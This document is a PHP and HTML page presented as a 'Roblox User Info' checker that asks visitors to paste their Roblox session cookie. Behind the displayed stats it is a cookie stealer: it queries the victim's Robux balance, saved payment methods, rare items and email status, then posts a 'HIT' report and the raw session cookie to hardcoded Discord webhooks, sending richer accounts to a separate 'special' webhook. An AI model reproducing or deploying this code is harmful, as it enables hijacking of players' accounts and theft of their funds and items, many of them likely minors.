<?php
function make_curl_request($url, $cookie, $csrf = null) {
    $headers = [
        "Content-Type: application/json",
        "Cookie: .ROBLOSECURITY=$cookie"
    ];
    if ($csrf) {
        $headers[] = "x-csrf-token: $csrf";
    }
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['response' => $response, 'http_status' => $http_status];
}

function get_csrf_token($cookie) {
    $url = "https://auth.roblox.com/v2/login";
    $headers = [
        "Content-Type: application/json",
        "Cookie: .ROBLOSECURITY=$cookie"
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_exec($ch);
    $csrf_headers = curl_getinfo($ch, CURLINFO_HEADER_OUT);
    curl_close($ch);
    preg_match('/x-csrf-token: (.+?)\r/', $csrf_headers, $matches);
    return $matches[1] ?? '';
}

function send_embed_to_discord($webhook_url, $embed_data) {
    $data = json_encode([
        'embeds' => [$embed_data]
    ]);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_exec($ch);
    curl_close($ch);
}

function sanitize_cookie($cookie) {
    return preg_replace('/_\|WARNING:-DO-NOT-SHARE-THIS\..+\|_/', '', $cookie);
}

if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $csrf = get_csrf_token($cookie);

    $user_info_response = make_curl_request("https://users.roblox.com/v1/users/authenticated", $cookie, $csrf);
    $user_info = json_decode($user_info_response['response'], true);

    if (isset($user_info['id'])) {
        $user_id = $user_info['id'];

        $account_details = json_decode(make_curl_request("https://users.roblox.com/v1/users/{$user_id}", $cookie, $csrf)['response'], true);
        $email = json_decode(make_curl_request("https://accountsettings.roblox.com/v1/email", $cookie, $csrf)['response'], true);
        $credit = json_decode(make_curl_request("https://billing.roblox.com/v1/credit", $cookie, $csrf)['response'], true);
        $robux_balance = json_decode(make_curl_request("https://economy.roblox.com/v1/users/{$user_id}/currency", $cookie, $csrf)['response'], true);
        $groups = json_decode(make_curl_request("https://groups.roblox.com/v1/users/{$user_id}/groups/roles", $cookie, $csrf)['response'], true);
        $bundles = json_decode(make_curl_request("https://catalog.roblox.com/v1/users/{$user_id}/bundles?limit=100", $cookie, $csrf)['response'], true);
        $saved_payment_methods = json_decode(make_curl_request("https://apis.roblox.com/payments-gateway/v1/payment-profiles", $cookie, $csrf)['response'], true);
        $roblox_premium = json_decode(make_curl_request("https://www.roblox.com/my/settings/json", $cookie)['response'], true);
        $transaction_summary = json_decode(make_curl_request("https://economy.roblox.com/v2/users/{$user_id}/transaction-totals?timeFrame=Year&transactionType=summary", $cookie, $csrf)['response'], true);
        
                $total_spent = $transaction_summary['data']['totalSpent'] ?? 0;
                $total_earned = $transaction_summary['data']['totalEarned'] ?? 0;
                $total_transaction_count = $transaction_summary['data']['totalTransactionCount'] ?? 0;
                $robux = $robux_balance['robux'] ?? 0;
        
                $games = [
                    'Adopt Me' => 920587237,
                    'Pet Simulator 99 (PS99)' => 3317771874, 
                    'Murder Mystery 2 (MM2)' => 142823291,
                ];
        
                $played_games = [];
                foreach ($games as $game_name => $game_id) {
                    $url = "https://games.roblox.com/v1/games/{$game_id}/votes/user";
                    $game_check_response = make_curl_request($url, $cookie, $csrf);
                    $game_data = json_decode($game_check_response['response'], true);
                    
                    if (isset($game_data['canVote']) && $game_data['canVote'] === true) {
                        $played_games[] = "$game_name: Played";
                    } else {
                        $played_games[] = "$game_name: Not Played";
                    }
                }
        
        $account_age = isset($account_details['created']) ? (new DateTime())->diff(new DateTime($account_details['created']))->days : 0;
        $email_verified = isset($email['verified']) ? ($email['verified'] ? 'True' : 'False') : 'No Email';
        $robux = $robux_balance['robux'] ?? 0;
        $limiteds_count = count($limiteds['data'] ?? []);
        $limiteds_rap = array_sum(array_column($limiteds['data'] ?? [], 'recentAveragePrice'));
        $korblox_owned = array_search(192, array_column($bundles['data'] ?? [], 'id')) !== false;
        $headless_owned = array_search(201, array_column($bundles['data'] ?? [], 'id')) !== false;
        $group_names_owned = [];
        foreach ($groups['data'] ?? [] as $group) {
            if ($group['role']['name'] === 'Owner') {
                $group_names_owned[] = $group['group']['name'];
            }
        }
        $payment_status = empty($saved_payment_methods) ? 'No' : 'Yes';
        $payment_status = empty($saved_payment_methods) ? 'No saved payment methods' : 'Saved payment method exists';
        $premium_status = isset($roblox_premium['IsPremium']) && $roblox_premium['IsPremium'] ? 'True' : 'False';
        $avatar_url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={$user_id}";

        $avatar_response = make_curl_request("https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={$user_id}", $cookie);

        if ($avatar_response['http_status'] == 200) {
            $avatar_data = json_decode($avatar_response['response'], true);
            if (isset($avatar_data['data'][0]['imageUrl'])) {
                $avatar_url = $avatar_data['data'][0]['imageUrl'];
            } else {
                $avatar_url = 'default_avatar_url.jpg'; 
            }
        } else {
            $avatar_url = 'default_avatar_url.jpg'; 
        }

        //FILTERD WEBHOOK

        $main_webhook = "https://discord.com/api/webhooks/1312390058975690783/DzweuR9B57ZG49ptUiInDOjRTO4PdEH0FE6n4LRdNDZ-9iMESLtInFe89ZzW4XYNTCfs";
        $special_webhook = "https://discord.com/api/webhooks/1312390124310499470/do1Rh85iip-xc-HGsklL22ALEOvvP9BdD5j4bd8vfDuzjkI4VqSPVMCE9J-_Xlax6k3P";
        $use_special = false;

        //FILTER SETTINGS
        if ($robux > 200 || $email_verified === 'False' && ($korblox_owned || $headless_owned) || $payment_status === 'Yes') {
            $use_special = true;
        }

        $webhook_url = $use_special ? $special_webhook : $main_webhook;
        
        $embed = [
            'title' => '💥 HIT 💥',
            'fields' => [
                ['name' => '👤 Username', 'value' => $user_info['name'], 'inline' => true],
                ['name' => '⏳ Account Age', 'value' => "{$account_age} days", 'inline' => true],
                ['name' => '💰 Robux Balance', 'value' => $robux, 'inline' => true],
                ['name' => '🌟 Roblox Premium', 'value' => $premium_status, 'inline' => true],
                ['name' => '👥 Owned Groups', 'value' => count($group_names_owned), 'inline' => true],
                ['name' => '🎩 Limiteds Count', 'value' => $limiteds_count, 'inline' => true],
                ['name' => '📉 Limiteds RAP', 'value' => $limiteds_rap, 'inline' => true],
                ['name' => '✔️ Email Verified', 'value' => $email_verified, 'inline' => true],
                ['name' => '💀 Korblox Owned', 'value' => $korblox_owned ? '🟢 True' : '🔴 False', 'inline' => true],
                ['name' => '💀 Headless Owned', 'value' => $headless_owned ? '🟢 True' : '🔴 False', 'inline' => true],
                ['name' => '💳 Saved Payment Methods', 'value' => $payment_status, 'inline' => true],
                ['name' => '📊 Summary', 'value' => $total_transaction_count, 'inline' => true],
                ['name' => '🎮 Game Status', 'value' => implode("\n", $played_games), 'inline' => false],
            ],
            'color' => 0xF77F00, 
            'thumbnail' => [
                'url' => $avatar_url
            ],
            'footer' => [
                'text' => '⚡ Powered by Discord'
            ]
        ];


        
        send_embed_to_discord($webhook_url, $embed);
        
        $sanitized_cookie = sanitize_cookie($cookie);
        send_embed_to_discord($webhook_url, [
            'title' => '🍪 Cookie Data 🍪',
            'description' => "Cookie: `$sanitized_cookie`",
            'color' => 0xF77F00, 
            'footer' => [
                'text' => '⚡ THE COOKIE IS NOT REFRESHED!'
            ]
        ]);        

    }
}
?>

/* */
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox User Info</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0d47a1; /* background */
            color: white;
            padding: 50px;
            text-align: center;
        }
        form {
            margin-bottom: 40px;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
            width: 300px;
            border: 2px solid #fff;
            border-radius: 5px;
            margin-right: 10px;
            color: black;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #d2a813;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #b88a13;
        }
        .info-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
        }
        .info-box h2 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        .info-box .info-item {
            margin-bottom: 15px;
            font-size: 18px;
        }
        .info-box .info-item span {
            font-weight: bold;
        }
        .error {
            color: red;
            font-size: 50px;
            font-weight: bold;
            text-align: center;
            margin-top: 50px;
            background-color: #ff4c4c;
            padding: 30px;
            border-radius: 10px;
            width: 80%;
            margin: 0 auto;
        }
    </style>
</head>
<body>


<form method="get" action="">
    <label for="cookie">Enter Roblox Cookie:</label>
    <input type="text" id="cookie" name="cookie" placeholder="Paste Roblox Cookie here" required>
    <button type="submit">Submit</button>
</form>


<?php if (isset($user_info) && $user_info !== null): ?>
    <div class="info-box">
        <h2>User Info</h2>
        <div class="info-item"><span>👤 Username:</span> <?php echo $user_info['name']; ?></div>
        <div class="info-item"><span>⏳ Account Age:</span> <?php echo $account_age; ?> days</div>
        <div class="info-item"><span>💰 Robux Balance:</span> <?php echo $robux; ?></div>
        <div class="info-item"><span>🌟 Roblox Premium:</span> <?php echo $premium_status; ?></div>
        <div class="info-item"><span>🎮 Games Played:</span> <?php echo implode(", ", $played_games); ?></div>
        <div class="info-item"><span>📊 Total Transactions:</span> <?php echo $total_transaction_count; ?></div>
        <div class="info-item"><span>💀 Korblox Owned:</span> <?php echo $korblox_owned ? '🟢 Yes' : '🔴 No'; ?></div>
        <div class="info-item"><span>💀 Headless Owned:</span> <?php echo $headless_owned ? '🟢 Yes' : '🔴 No'; ?></div>
        <div class="info-item"><span>✔️ Email Verified:</span> <?php echo $email_verified; ?></div>
        <div class="info-item"><span>📉 Limiteds RAP:</span> <?php echo $limiteds_rap; ?></div>
        <div class="info-item"><span>👥 Owned Groups:</span> <?php echo count($group_names_owned); ?></div>
        <div class="info-item"><span>💳 Payment Methods:</span> <?php echo $payment_status; ?></div>
    </div>
<?php endif; ?>

</body>
</html>
